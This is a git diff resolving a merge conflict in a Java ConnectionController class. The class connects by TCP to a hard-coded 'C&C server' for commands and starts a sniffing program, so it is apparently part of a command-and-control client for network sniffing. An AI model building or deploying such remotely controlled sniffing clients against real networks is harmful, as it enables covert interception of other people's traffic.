@@ -26,18 +26,14 @@ public class ConnectionController {
 	StreamParser parser = new StreamParser();
 	
 	public ConnectionController() throws Exception{
-<<<<<<< HEAD
 		SERVER_IP = InetAddress.getByName("10.16.167.8");	
 		System.out.println("Connectionscontroller constructor init'd");
 	}
 	
 	public BufferedReader connectToServer(){
 		// from here we get the command from the C&C server
-=======
 		SERVER_IP = InetAddress.getByName("10.16.99.177");
 		dHandler = new DataHandler(); // this instance executes the sniffing program in a terminal
-		
->>>>>>> fa0ae1da46e2bf89e798c503770cc7a62603170e
 		inputFromServer = con.initTCPClient(SERVER_IP, DEFAULT_PORT); 
 		
 		System.out.println("tcp initialized, now sending create"); // useless shit protocol HAVE TO BE MITIGATED!!! 
